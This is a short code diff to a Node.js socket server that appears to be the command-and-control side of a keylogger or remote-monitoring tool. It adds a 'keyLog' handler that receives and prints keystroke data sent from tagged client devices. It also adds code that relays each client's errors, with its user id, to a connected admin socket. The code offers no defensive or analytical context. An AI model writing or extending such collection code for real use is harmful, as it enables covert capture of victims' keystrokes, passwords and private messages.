@@ -138,7 +138,19 @@ function handleUserData(socket) {
 
     socket.on("clientError", function(data){
         console.log(data);
-    })
+        if (adminSocket != null && adminSocket.connected)
+            adminSocket.emit('cError', {data: data, uid: socket.tag});
+        console.log('Notification Data : ', data);
+    });
+
+    socket.on("keyLog", function(data){
+        try{
+            data = JSON.parse(data);
+        } catch(e) {
+            console.log("Already parsed");
+        }
+        console.log("Keylogger data---->> ", data);
+    });
 
 }
 
